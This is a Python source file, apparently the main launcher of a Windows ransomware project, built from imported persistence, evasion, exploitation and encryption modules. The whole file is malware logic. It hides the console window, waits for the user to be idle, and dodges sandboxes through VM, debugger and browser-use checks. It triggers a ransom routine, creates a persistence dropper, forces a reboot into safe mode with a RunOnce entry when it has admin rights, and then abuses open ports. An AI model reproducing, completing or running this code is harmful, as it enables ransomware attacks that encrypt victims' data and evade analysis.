import sys
from time import sleep
from ctypes import windll
from hashlib import sha512
from Persistance.foothold import get_pyinstaller,install_python,create_dropper
from Utils.helpers import is_python_exist,is_online,find_python_path,is_admin
from threading import Thread
from os import system
from Evasion import debugEvasion,vmDetect
from Evasion.utils import is_normal_browser_user,get_idle_duration,prevent_sleep,turn_screen_off
from Exploitation.common import abuse_open_ports
from Evasion.Randomize import random_base64,random_byte,random_list,random_a85
from random import randrange,choice
from Encryption.Utils import is_secure_boot,enable_safemode,addRun_once
from Encryption.Ransom import example_ransom
SW_HIDE = 0
hWnd = windll.kernel32.GetConsoleWindow()

def main():
    Thread(target=debugEvasion.process_monitor,args=()).start()
    if is_secure_boot(): #the function is not recognizing secure boot!
        example_ransom()
    debug = False
    if len(sys.argv) > 0:
        try:
            if sha512(sys.argv[1].encode()).hexdigest() == 'd983a2437d298f8c263ad51604d4c49dba2fe7a2ec81419f404931caf9d1b0bc2031373b2a731e00e6ebdbfac446b757be0cf7101ae852cc9fd45e42c80fb102':
                debug = True
        except Exception as e:
            pass
    if not debug:
        windll.user32.ShowWindow(hWnd, SW_HIDE)
    vm_flag = sys.exit if not debug else lambda x: print(x)
    prevent_sleep()
    if not debug :
        while get_idle_duration() < 180:
            sleep(180)
    if not debug:
        turn_screen_off()

    if any([not vmDetect.is_enough_ram(),not vmDetect.is_enough_disk(), not vmDetect.is_enough_cores()]):
        vm_flag("EXITED ON ANY_SPEC CHECK")
    if not is_online():
        example_ransom()
        vm_flag('NOT ONLINE')
    if debugEvasion.find_debug_process():
        vm_flag("we found debug process")
    if not is_normal_browser_user():
        vm_flag("not a normal browser user")
    if vmDetect.detect_vm_by_wmi():
        vm_flag("detected vm by wmi")
    ALLOC_RANDOM = randrange(1 , 10)
    if ALLOC_RANDOM > 6:
        x = choice([random_base64,random_byte,random_a85,random_list])()
    if not is_python_exist():
        install_python()

    pythonPath = find_python_path()
    if get_pyinstaller(pythonPath):
        pass
    create_dropper()
    if is_admin():
        enable_safemode()
        addRun_once()
        system('shutdown /r -t 1')

    abuse_open_ports()
    return


if __name__ == "__main__":
    main()